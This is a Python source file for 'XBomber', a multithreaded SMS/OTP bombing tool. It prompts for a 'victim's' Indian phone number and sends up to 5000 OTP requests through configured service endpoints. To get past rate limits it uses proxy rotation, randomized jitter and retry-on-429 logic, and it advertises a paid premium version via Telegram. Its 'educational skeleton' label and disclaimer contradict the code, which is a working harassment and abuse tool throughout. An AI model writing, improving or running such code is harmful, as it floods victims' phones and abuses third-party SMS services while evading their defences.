#!/usr/bin/env python3
"""
XBomber - Educational CLI Tool Skeleton
Author  : Alienkrishn [Anon4You]
Version : 3.0.0
Purpose : Demonstrates clean Python CLI architecture using Rich, threading,
          dataclasses, and structured config loading. NOT for malicious use.
"""

# ─── Standard Library ────────────────────────────────────────────────────────
import json
import logging
import os
import platform
import shutil
import subprocess
import sys
import threading
import time
import webbrowser
from dataclasses import dataclass, field
from pathlib import Path
from queue import Empty, Queue
from typing import Optional
from urllib.parse import urlparse
import random

# ─── Third-Party ─────────────────────────────────────────────────────────────
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from rich.columns import Columns
    from rich.console import Console
    from rich.layout import Layout
    from rich.live import Live
    from rich.logging import RichHandler
    from rich.panel import Panel
    from rich.progress import (
        BarColumn,
        MofNCompleteColumn,
        Progress,
        SpinnerColumn,
        TaskProgressColumn,
        TextColumn,
        TimeElapsedColumn,
        TimeRemainingColumn,
    )
    from rich.prompt import Confirm, Prompt
    from rich.rule import Rule
    from rich.table import Table
    from rich.text import Text
    from rich.theme import Theme
except ImportError as e:
    print(f"[ERROR] Missing dependency: {e}")
    print("Run: pip install rich requests")
    sys.exit(1)


# ─── Logging Setup ───────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.WARNING,
    format="%(message)s",
    handlers=[RichHandler(rich_tracebacks=True, show_path=False)],
)
log = logging.getLogger("xbomber")


# ─── Theme ───────────────────────────────────────────────────────────────────
THEME = Theme({
    "success":  "bold green",
    "error":    "bold red",
    "warning":  "bold yellow",
    "info":     "bold cyan",
    "muted":    "dim white",
    "accent":   "bold magenta",
    "premium":  "bold gold1",
})

console = Console(theme=THEME)


# ─── Constants ───────────────────────────────────────────────────────────────
VERSION       = "3.0.0"
AUTHOR        = "Alienkrishn [Anon4You]"
TELEGRAM      = "https://t.me/nullxvoid"
PREMIUM_URL   = "https://t.me/alienkrishn?text=xbomber%20premium"
CONFIG_PATH   = Path("assets/services.json")
MAX_SMS       = 5000
DEFAULT_THREADS = 20



# ─── Data Models ─────────────────────────────────────────────────────────────
@dataclass
class Service:
    """Represents a single SMS/OTP service endpoint."""
    name:         str
    url:          str
    method:       str                    = "POST"
    headers:      dict                   = field(default_factory=dict)
    data:         Optional[dict]         = None
    phone_format: str                    = "raw"   # raw | with_plus91 | 91-
    encoding:     str                    = "json"  # json | form

    def __post_init__(self):
        self.method = self.method.upper()
        allowed_methods = {"GET", "POST", "PUT", "PATCH"}
        if self.method not in allowed_methods:
            raise ValueError(f"Service '{self.name}': unsupported method '{self.method}'")

    @staticmethod
    def from_dict(raw: dict) -> "Service":
        return Service(
            name         = raw["name"],
            url          = raw["url"],
            method       = raw.get("method", "POST"),
            headers      = raw.get("headers", {}),
            data         = raw.get("data"),
            phone_format = raw.get("phone_format", "raw"),
            encoding     = raw.get("encoding", "json"),
        )


@dataclass
class BombResult:
    """Result from a single service call."""
    service_name: str
    success:      bool
    status_code:  Optional[int] = None
    error:        Optional[str] = None


@dataclass
class BombReport:
    """Aggregate report after a bombing session."""
    phone:      str
    total:      int
    results:    list[BombResult] = field(default_factory=list)
    elapsed:    float = 0.0

    @property
    def success_count(self) -> int:
        return sum(1 for r in self.results if r.success)

    @property
    def fail_count(self) -> int:
        return self.total - self.success_count

    @property
    def success_rate(self) -> float:
        if not self.results:
            return 0.0
        return (self.success_count / len(self.results)) * 100


# ─── Config Loader ───────────────────────────────────────────────────────────
class ConfigLoader:
    """Handles loading and validating services.json."""

    _cache: Optional[list[Service]] = None

    @classmethod
    def load(cls, path: Path = CONFIG_PATH) -> list[Service]:
        if cls._cache is not None:
            return cls._cache

        if not path.exists():
            console.print(f"[error]Config not found:[/error] {path}")
            sys.exit(1)

        try:
            with path.open("r", encoding="utf-8") as f:
                raw = json.load(f)
        except json.JSONDecodeError as e:
            console.print(f"[error]Invalid JSON in config:[/error] {e}")
            sys.exit(1)

        if "services" not in raw or not isinstance(raw["services"], list):
            console.print("[error]Config must have a 'services' list.[/error]")
            sys.exit(1)

        services: list[Service] = []
        for i, entry in enumerate(raw["services"]):
            try:
                services.append(Service.from_dict(entry))
            except (KeyError, ValueError) as e:
                log.warning("Skipping service #%d: %s", i, e)

        if not services:
            console.print("[error]No valid services found in config.[/error]")
            sys.exit(1)

        cls._cache = services
        return services


# ─── Phone Formatter ─────────────────────────────────────────────────────────
class PhoneFormatter:
    """Formats a raw 10-digit number based on the service's expected format."""

    @staticmethod
    def format(phone: str, fmt: str) -> str:
        p = phone.strip()
        match fmt:
            case "with_plus91":
                return f"+91{p}"
            case "91-":
                return f"91-{p}"
            case "91":
                return f"91{p}"
            case _:
                return p


# ─── HTTP Worker ─────────────────────────────────────────────────────────────





REQUEST_TIMEOUT = (5, 10)

_thread_local = threading.local()

PROXIES = [  
    # Example:  
    # "http://user:pass@ip:port",  
    # "http://ip:port",  
   ]



# =========================================================
# PROXY HEALTH TRACKING
# =========================================================

proxy_health = {
    proxy: 100
    for proxy in PROXIES
}


def mark_proxy_failure(proxy):
    if proxy in proxy_health:
        proxy_health[proxy] -= 25


def mark_proxy_success(proxy):
    if proxy in proxy_health:
        proxy_health[proxy] = min(
            proxy_health[proxy] + 5,
            100
        )


def get_random_proxy():
    healthy = [
        p for p, score in proxy_health.items()
        if score > 0
    ]

    if not healthy:
        return None

    proxy = random.choice(healthy)

    return {
        "http": proxy,
        "https": proxy,
    }


# =========================================================
# SESSION MANAGEMENT
# =========================================================

def get_session() -> requests.Session:

    if hasattr(_thread_local, "session"):
        return _thread_local.session

    session = requests.Session()

    retries = Retry(
        total=2,
        connect=1,
        read=1,
        status=2,

        backoff_factor=1,

        status_forcelist=[
            429,
            500,
            502,
            503,
            504,
        ],

        allowed_methods=[
            "GET",
            "POST",
            "PUT",
            "PATCH",
        ],

        raise_on_status=False,
    )

    adapter = HTTPAdapter(
        max_retries=retries,
        pool_connections=20,
        pool_maxsize=20,
    )

    session.mount("http://", adapter)
    session.mount("https://", adapter)

    _thread_local.session = session

    return session


# =========================================================
# REQUEST WORKER
# =========================================================

class RequestWorker:

    @staticmethod
    def _interpolate(template: str, phone_str: str):
        return template.replace("{phone}", phone_str)

    @staticmethod
    def _host_alive(url: str) -> bool:

        try:
            parsed = urlparse(url)

            if not parsed.hostname:
                return False

            import socket

            socket.gethostbyname(parsed.hostname)

            return True

        except Exception as exc:
            print("HOST CHECK ERROR:", exc)
            return False

    @classmethod
    def send(cls, svc, phone):

        formatted = PhoneFormatter.format(
            phone,
            svc.phone_format
        )

        url = cls._interpolate(
            svc.url,
            formatted
        )

        # Skip dead domains immediately
        if not cls._host_alive(url):

            return BombResult(
                svc.name,
                False,
                error="DNS lookup failed"
            )
        headers = dict(svc.headers)
        

        body = None

        if svc.data:
            raw = json.dumps(svc.data)

            body = json.loads(
                cls._interpolate(raw, formatted)
            )

        try:

            response = cls._dispatch(
                method=svc.method,
                url=url,
                headers=headers,
                body=body,
                encoding=svc.encoding,
            )

            success = (
    200 <= response.status_code < 300
)

            return BombResult(
                service_name=svc.name,
                success=success,
                status_code=response.status_code,
            )

        except requests.exceptions.SSLError:

            return BombResult(
                svc.name,
                False,
                error="SSL verification failed"
            )

        except requests.exceptions.ConnectTimeout:

            return BombResult(
                svc.name,
                False,
                error="Connection timeout"
            )

        except requests.exceptions.ReadTimeout:

            return BombResult(
                svc.name,
                False,
                error="Read timeout"
            )

        except requests.exceptions.ProxyError:

            return BombResult(
                svc.name,
                False,
                error="Proxy failure"
            )

        except requests.exceptions.ConnectionError as exc:

            msg = str(exc)

            if "NameResolutionError" in msg:

                return BombResult(
                    svc.name,
                    False,
                    error="DNS resolution failed"
                )

            if "RemoteDisconnected" in msg:

                return BombResult(
                    svc.name,
                    False,
                    error="Remote disconnected"
                )

            return BombResult(
                svc.name,
                False,
                error="Connection error"
            )

        except Exception as exc:

            return BombResult(
                svc.name,
                False,
                error=str(exc)
            )

    @staticmethod
    def _dispatch(
        method,
        url,
        headers,
        body,
        encoding,
    ):

        session = get_session()

        # IMPORTANT:
        # Use ONE proxy for entire request lifecycle
        proxy = get_random_proxy()

        kwargs = {
            "headers": headers,
            "timeout": REQUEST_TIMEOUT,
            "verify": True,
        }

        if proxy:
            kwargs["proxies"] = proxy

        if body is not None:

            if encoding == "form":
                kwargs["data"] = body
            else:
                kwargs["json"] = body

        dispatch = {
            "GET": session.get,
            "POST": session.post,
            "PUT": session.put,
            "PATCH": session.patch,
        }

        fn = dispatch.get(method)

        if fn is None:
            raise ValueError(
                f"Unsupported HTTP method: {method}"
            )

        max_attempts = 3

        last_response = None

        for attempt in range(max_attempts):

            # Human-like jitter
            time.sleep(
                random.uniform(0.5, 1.5)
            )

            try:

                response = fn(
                    url,
                    **kwargs,
                )

                last_response = response

                # Handle rate limits
                if response.status_code == 429:

                    retry_after = response.headers.get(
                        "Retry-After"
                    )

                    if (
                        retry_after
                        and retry_after.isdigit()
                    ):
                        sleep_time = int(retry_after)

                    else:
                        sleep_time = (
                            (2 ** attempt)
                            + random.uniform(1, 3)
                        )

                    time.sleep(sleep_time)

                    continue

                # Proxy succeeded
                if proxy:
                    mark_proxy_success(
                        proxy["http"]
                    )

                return response

            except (
                requests.exceptions.ProxyError,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
            ):

                if proxy:
                    mark_proxy_failure(
                        proxy["http"]
                    )

                # Exponential backoff
                time.sleep(
                    (2 ** attempt)
                    + random.uniform(0.5, 1.5)
                )

                continue

        if last_response:
            return last_response

        raise requests.exceptions.ConnectionError(
            "Request failed after retries"
        )

# ─── Thread Pool Bomber ───────────────────────────────────────────────────────
class Bomber:
    """
    Manages a thread-pool based bombing session.

    Architecture note:
      Uses a producer/consumer pattern with a Queue.
      Each thread pulls tasks from the queue and reports results
      back via a shared list (thread-safe for appends in CPython,
      but a Lock is used here explicitly for correctness).
    """

    def __init__(self, phone: str, total: int, thread_count: int = DEFAULT_THREADS):
        self.phone        = phone
        self.total        = total
        self.thread_count = thread_count
        self._queue: Queue[Service] = Queue()
        self._results: list[BombResult] = []
        self._lock        = threading.Lock()
        self._progress: Optional[Progress] = None
        self._task_id     = None

    def _build_task_queue(self, services: list[Service]) -> None:
        """Repeat the service list until we have `total` tasks."""
        count = 0
        while count < self.total:
            for svc in services:
                if count >= self.total:
                    break
                self._queue.put(svc)
                count += 1

    def _worker(self) -> None:
        while True:
            try:
                svc = self._queue.get_nowait()
            except Empty:
                break
            try:
                result = RequestWorker.send(svc, self.phone)
            except Exception as exc:
                print("WORKER ERROR:", exc)
                raise
            with self._lock:
                self._results.append(result)
            if self._progress and self._task_id is not None:
                self._progress.advance(self._task_id)
            self._queue.task_done()

    def run(self, progress: Progress, task_id) -> BombReport:
        self._progress = progress
        self._task_id  = task_id

        services = ConfigLoader.load()
        self._build_task_queue(services)

        start = time.perf_counter()

        threads = [
            threading.Thread(target=self._worker, daemon=True)
            for _ in range(min(self.thread_count, self.total))
        ]
        for t in threads:
            t.start()

        # Wait until queue is drained (daemon threads exit when main exits)
        self._queue.join()

        elapsed = time.perf_counter() - start

        return BombReport(
            phone=self.phone,
            total=self.total,
            results=self._results,
            elapsed=elapsed,
        )


# ─── Banner ──────────────────────────────────────────────────────────────────
def render_banner() -> None:
    """Renders the ASCII art banner using pure Rich (no shell injection)."""
    # Build the ASCII art as a Rich Text object so it's portable
    lines = [
        (" #     # ", "bold magenta"),
        ("  #   #  ", "bold magenta"),
        ("   # #   ", "bold magenta"),
        ("    #    ", "bold magenta"),
        ("   # #   ", "bold magenta"),
        ("  #   #  ", "bold magenta"),
        (" #     # ", "bold magenta"),
    ]
    right = [
        (f"#####   ####  #    # #####  ", "bold cyan"),
        ("#    # #    # ##  ## #    # ", "bold cyan"),
        ("#####  #    # # ## # #####  ", "bold cyan"),
        ("#    # #    # #    # #    # ", "bold cyan"),
        ("#    # #    # #    # #    # ", "bold cyan"),
        ("#    # #    # #    # #    # ", "bold cyan"),
        ("#####   ####  #    # #####  ", "bold cyan"),
    ]
    suffix = [
        (f"###### #####  ", "bold red"),
        ("#      #    # ", "bold red"),
        ("#####  #    # ", "bold red"),
        ("#      #####  ", "bold red"),
        ("#      #   #  ", "bold red"),
        ("#      #    # ", "bold red"),
        ("###### #    # ", "bold red"),
    ]

    art = Text()
    for i, (l, s, r) in enumerate(zip(lines, right, suffix)):
        art.append("    " + l[0], style=l[1])
        art.append(s[0], style=s[1])
        art.append(r[0], style=r[1])
        if i == 0:
            art.append(f"v{VERSION}", style="dim white")
        art.append("\n")

    console.print(art)
    console.print(f"    [bold yellow]              Created by {AUTHOR}[/bold yellow]")
    console.print(f"    [bold blue]              Telegram: {TELEGRAM}[/bold blue]\n")

    disclaimer = Panel(
        "[bold white]DISCLAIMER: Developer will not be responsible\n"
        "for any misuse or damage caused by this script.\n"
        "Please do not use this script for taking Revenge.\n"
        "Use this tool for [underline]educational purposes only[/underline].[/bold white]",
        border_style="red",
        expand=True,
    )
    console.print(disclaimer)
    console.print()


# ─── UI Helpers ──────────────────────────────────────────────────────────────
def clear_screen() -> None:
    os.system("cls" if platform.system() == "Windows" else "clear")


def open_url(url: str) -> None:
    """
    Open a URL using the best available method for the current OS.
    Priority: xdg-open (Linux) → open (macOS) → webbrowser (fallback).
    """
    system = platform.system()
    if system == "Linux" and shutil.which("xdg-open"):
        subprocess.run(["xdg-open", url], check=False)
    elif system == "Darwin" and shutil.which("open"):
        subprocess.run(["open", url], check=False)
    else:
        webbrowser.open(url)


def wait_for_enter(msg: str = "\nPress Enter to continue...") -> None:
    console.input(f"[muted]{msg}[/muted]")


def print_report(report: BombReport) -> None:
    """Render a styled post-bombing summary table."""
    table = Table(
        title=f"Bombing Report — {report.phone}",
        title_style="bold cyan",
        border_style="cyan",
        show_lines=True,
    )
    table.add_column("Metric",    style="info",    min_width=20)
    table.add_column("Value",     style="white",   min_width=15)

    table.add_row("Phone",         report.phone)
    table.add_row("Total Sent",    str(report.total))
    table.add_row("Elapsed",       f"{report.elapsed:.2f}s")
    table.add_row("Successful",    f"[success]{report.success_count}[/success]")
    table.add_row("Failed",        f"[error]{report.fail_count}[/error]")
    table.add_row("Success Rate",  f"{report.success_rate:.1f}%")
    table.add_row(
        "Throughput",
        f"{report.total / report.elapsed:.1f} req/s" if report.elapsed > 0 else "N/A"
    )

    console.print()
    console.print(table)

    # Show per-service breakdown if ≤ 30 results (avoid wall of text)
    if len(report.results) <= 30:
        svc_table = Table(
            title="Per-Service Breakdown",
            border_style="dim",
            show_header=True,
        )
        svc_table.add_column("Service",     style="cyan")
        svc_table.add_column("Status",      justify="center")
        svc_table.add_column("HTTP Code",   justify="right", style="muted")
        svc_table.add_column("Error",       style="muted")

        for r in report.results:
            status = "[success]OK[/success]" if r.success else "[error]FAIL[/error]"
            code   = str(r.status_code) if r.status_code else "—"
            err    = r.error or ""
            svc_table.add_row(r.service_name, status, code, err)

        console.print(svc_table)


# ─── Screens ─────────────────────────────────────────────────────────────────
def screen_start_bombing() -> None:
    console.print(Rule("[info]Start Bombing[/info]", style="cyan"))

    phone = Prompt.ask("[success]Victim's 10-digit phone (without +91)[/success]")
    if not (phone.isdigit() and len(phone) == 10):
        console.print("[error]Invalid number. Must be exactly 10 digits.[/error]")
        wait_for_enter()
        return

    try:
        total = int(Prompt.ask("[success]Number of SMS to send[/success]", default="100"))
        assert 1 <= total <= MAX_SMS
    except (ValueError, AssertionError):
        console.print(f"[error]Count must be between 1 and {MAX_SMS}.[/error]")
        wait_for_enter()
        return

    thread_count = DEFAULT_THREADS
    if Confirm.ask("[warning]Adjust thread count?[/warning]", default=False):
        try:
            thread_count = int(Prompt.ask("Threads", default=str(DEFAULT_THREADS)))
            thread_count = max(1, min(thread_count, 100))
        except ValueError:
            thread_count = DEFAULT_THREADS

    console.print(
        f"\n[warning]Bombing [bold]{phone}[/bold] with "
        f"[bold]{total}[/bold] messages using "
        f"[bold]{thread_count}[/bold] threads...[/warning]\n"
    )

    bomber = Bomber(phone=phone, total=total, thread_count=thread_count)

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=40),
        MofNCompleteColumn(),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        TimeRemainingColumn(),
        console=console,
        transient=False,
    ) as progress:
        task_id = progress.add_task("[cyan]Sending requests...", total=total)
        report  = bomber.run(progress, task_id)

    print_report(report)
    wait_for_enter()


def screen_protect_number() -> None:
    console.print(Rule("[premium]Number Protection[/premium]", style="gold1"))
    console.print(Panel.fit(
        "[error]Number protection is only available in the PREMIUM script.[/error]\n"
        "[muted]Contact the developer to get access.[/muted]",
        title="[premium]Premium Feature[/premium]",
        border_style="gold1",
    ))
    if Confirm.ask("[warning]Open Telegram to purchase premium?[/warning]", default=False):
        open_url(PREMIUM_URL)
        console.print("[success]Opening Telegram...[/success]")
    else:
        console.print("[muted]Returning to menu.[/muted]")

    wait_for_enter()


def screen_about() -> None:
    console.print(Rule("[info]About[/info]", style="cyan"))
    console.print(Panel(
        f"[bold]XBomber v{VERSION}[/bold]\n\n"
        f"Author   : [accent]{AUTHOR}[/accent]\n"
        f"Telegram : [link={TELEGRAM}]{TELEGRAM}[/link]\n"
        f"Config   : {CONFIG_PATH}\n"
        f"Max SMS  : {MAX_SMS}\n"
        f"Threads  : {DEFAULT_THREADS} (default)",
        title="Tool Info",
        border_style="cyan",
    ))

    # Show loaded services summary
    try:
        services = ConfigLoader.load()
        svc_table = Table(border_style="dim", title=f"Loaded Services ({len(services)})")
        svc_table.add_column("Name",    style="cyan")
        svc_table.add_column("Method",  justify="center")
        svc_table.add_column("Format")
        for s in services:
            svc_table.add_row(s.name, s.method, s.phone_format)
        console.print(svc_table)
    except SystemExit:
        console.print("[error]Could not load services config.[/error]")

    wait_for_enter()


# ─── Main Menu ───────────────────────────────────────────────────────────────
MENU_OPTIONS = {
    "1": ("Start Bombing",      screen_start_bombing),
    "2": ("Protect My Number",  screen_protect_number),
    "3": ("About / Services",   screen_about),
    "4": ("Exit",               None),
}


def menu() -> None:
    while True:
        clear_screen()
        render_banner()

        console.print(Panel.fit("[warning]MAIN MENU[/warning]", border_style="yellow"))
        for key, (label, _) in MENU_OPTIONS.items():
            color = "red" if key == "4" else "cyan"
            console.print(f"  [{color}]{key}.[/{color}] {label}")

        console.print()
        choice = Prompt.ask(
            "[info]Select option[/info]",
            choices=list(MENU_OPTIONS.keys()),
            show_choices=False,
        )

        label, handler = MENU_OPTIONS[choice]
        if handler is None:
            console.print("\n[error]Exiting XBomber. Goodbye.[/error]\n")
            break

        clear_screen()
        handler()


# ─── Entry Point ─────────────────────────────────────────────────────────────
def main() -> None:
    try:
        menu()
    except KeyboardInterrupt:
        console.print("\n[error]Interrupted. Exiting...[/error]")
        sys.exit(0)


"""
def validate_proxy(proxy):
    try:
        proxies = {
            "http": proxy,
            "https": proxy,
        }

        r = requests.get(
            "https://httpbin.org/ip",
            proxies=proxies,
            timeout=8,
            verify=True,
        )

        if r.status_code == 200:
            print(f"[OK] {proxy}")
            return True

    except Exception as exc:
        print(f"[BAD] {proxy} -> {exc}")

    return False
"""

if __name__ == "__main__":
  main()
